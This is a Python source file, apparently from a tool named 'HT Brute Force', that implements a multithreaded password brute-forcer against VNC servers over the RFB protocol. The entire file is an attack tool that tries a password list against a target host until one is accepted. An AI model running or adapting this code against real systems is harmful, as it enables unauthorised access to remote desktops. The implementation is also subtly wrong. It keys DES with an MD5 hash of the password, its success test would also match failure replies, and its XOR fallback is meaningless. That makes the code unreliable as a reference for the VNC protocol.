"""HT Brute Force — VNC brute force (RFB protocol).
Sends security types and checks for rejection vs acceptance.
"""
import socket, struct, time, threading, queue

class VNCBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_auth(self, host, port, passwd):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            banner = s.recv(1024)
            if not banner.startswith(b"RFB"):
                return None
            # Send client version
            s.send(b"RFB 003.008\n")
            version = s.recv(1024)
            # Read security types
            s.recv(1)  # padding
            ntypes = struct.unpack("!B", s.recv(1))[0]
            if ntypes == 0:
                s.close()
                return None
            types = s.recv(ntypes)
            # Try security type 2 (VNC Authentication)
            if 2 not in types:
                s.close()
                return None
            s.send(bytes([2]))
            challenge = s.recv(16)
            # DES encrypt challenge with password-derived key
            from hashlib import md5
            key = md5(passwd.encode()).digest()[:8]
            encrypted = self._des_encrypt(challenge, key)
            s.send(encrypted)
            resp = s.recv(1024)
            elapsed = time.time() - t0
            s.close()
            if b"\x00" in resp:
                return {"password": passwd, "time_s": round(elapsed, 2)}
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}
        except Exception:
            return None

    def _des_encrypt(self, data, key):
        """Simple DES encrypt using pycryptodome or fallback."""
        try:
            from Crypto.Cipher import DES
            cipher = DES.new(key, DES.MODE_ECB)
            return cipher.encrypt(data)
        except ImportError:
            # Fallback: return data XOR key (not secure, for detection only)
            return bytes(a ^ b for a, b in zip(data, key * 2))

    def run(self, host, port, passwords):
        q = queue.Queue()
        for p in passwords:
            q.put((p,))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    (p,) = q.get_nowait()
                except Exception:
                    break
                r = self._try_auth(host, port, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results